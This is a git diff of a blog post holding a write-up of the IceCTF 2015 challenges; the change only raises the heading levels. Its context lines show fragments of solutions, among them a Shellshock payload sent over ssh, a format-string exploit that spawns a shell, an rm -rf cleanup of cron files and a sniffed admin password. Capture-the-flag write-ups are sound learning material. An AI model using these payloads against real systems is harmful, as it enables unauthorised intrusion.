@@ -3,7 +3,7 @@ layout: post
 title: "ICEC.TF writeup"
 categories: [writeup, ctf, icectf]
 ---
-## ROT13
+# ROT13
 
 ```
 $ python
@@ -14,10 +14,10 @@ Python 2.7.6 (default, Sep  9 2014, 15:04:36)
 "I feel like this is a good place to store all my secure flags. Infact, here's the flag: rot_13_isnt_secure"
 ```
 
-## Cryptic Crypto
+# Cryptic Crypto
 For substitution cipher: http://quipqiup.com/index.php 
 
-## Statistics
+# Statistics
 
 ```python
 #!/usr/bin/env python
@@ -56,21 +56,21 @@ while True:
     r.sendline(answer)
 ```
 
-## Ryan Gooseling
+# Ryan Gooseling
 ```
 binwalk + scalpel (uncommenting jpg)
 ```
 
-## SHARKNADO!
+# SHARKNADO!
 ```
 root@kali32:~# tcpick -C -yU -r  sharknado.pcap  | grep -i admin
 username=admin&password=IAmALittlePasswordShortAndStout
 ```
 
-## Farm Animals
+# Farm Animals
 https://en.wikipedia.org/wiki/Pigpen_cipher
 
-## RSA
+# RSA
 
 ```python
 N = 0xc8283502d6ed4c723078d5ddd299c67deaef48ca2d8cdce64f99fe50ee5705705ab25c220ba6a1521c068016aab51f5139962bf8362f8b5ea157fc3ecefebe6dec216ba655c3f2b1538907182760ffde203bbed8e0a41bc833e94369e631b7a559f71e7ed773f029b82f46fbb0842f898048e45e15330b6671a8dbda59b025eb
@@ -93,14 +93,14 @@ $ ./sage /tmp/rsa1.sage
 flag_dont_you_just_love_rsa
 ```
 
-## Shocked!
+# Shocked!
 ```
 $ ssh -p 2022 ctf@vuln2015.icec.tf '() { :;}; cat flag.txt'
 ctf@vuln2015.icec.tf's password:
 The flag is: shocking_the_shellz_is_fun
 ```
 
-## Hackers in disguise
+# Hackers in disguise
 I have found the solution for the almost same [challenge](http://ehsandev.com/pico2014/web_exploitation/make_a_face.html), more information 
 abouth the vulnerability [here](http://www.cgisecurity.com/lib/sips.html).
 
@@ -151,7 +151,7 @@ flag_why_did_we_stop_using_perl_again
 ```
 
 
-## Fermat
+# Fermat
 ```
 [ctf-7119@icectf-shell /home/fermat]$ ./fermat "$(python -c 'print "\x2c\xa0\x04\x08       %135$1326x%135$n"')"
 , sh-4.2$ id
@@ -160,7 +160,8 @@ sh-4.2$ cat flag.txt
 flag_fermats_last_exploit
 ```
 
-## Barista
+# Barista
+
 Similarly like in [Hack.lu CTF 2014: Objection](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/objection), we overwroted the `getter` function for `is_admin`:
 
 Vulnerable line:
@@ -178,7 +179,7 @@ http://coffee.icec.tf/__defineGetter__?args=is_admin
 undefined + flag_i_dont_even_like_coffee_but_i_love_coffeescript
 ```
 
-## PyShell
+# PyShell
 
 Similar as here: https://hexplo.it/escaping-the-csawctf-python-sandbox/
 
@@ -204,7 +205,7 @@ Welcome to my Python sandbox! Enter commands below! Please don't mess up my serv
 The flag is: not_your_average_python
 ```
 
-## Entropy
+# Entropy
 
 We have the python daemon, that uses only a few primes (they are stored in text file and keys are generated almost instantly). 
 
@@ -296,7 +297,7 @@ print(flag)
 flag_keep_the_prime_count_high
 ```
 
-## Authorize
+# Authorize
 Time-delay injection in register field, using POST method:
 
 ```php
@@ -338,7 +339,7 @@ Logged in!
 Your flag is: flag_binary_search_those_credentials
 ```
 
-## Elevate
+# Elevate
 
 ```c
 #include <stdio.h>
@@ -418,7 +419,7 @@ Correct! Here's an elevated shell :)
 flag_c21f22c6ff839828124be4f38677f7cf
 ```
 
-## Supernote
+# Supernote
 Exploitable code:
 
 ```c
@@ -581,7 +582,7 @@ rm -rf /home/supernote/cron.d/*
 rm -rf /home/supernote/cron.d/.* 2> /dev/null
 ```
 
-## Wiki & The Furious
+# Wiki & The Furious
 DOM Based XSS challenge. The vulnerable code:
 
 ```javascript
@@ -649,7 +650,7 @@ After setting cookie to the value `s:NO7VjJneMo5ArzEcrwTUXMIR2W9A05RU.Xg8/oyINQG
 we was able to read the flag: `flag_so_simple_yet_so_hard `.
 
 
-## What
+# What
 Simple RE challenge. There is a binary without source code, performing a
 several checks:
 
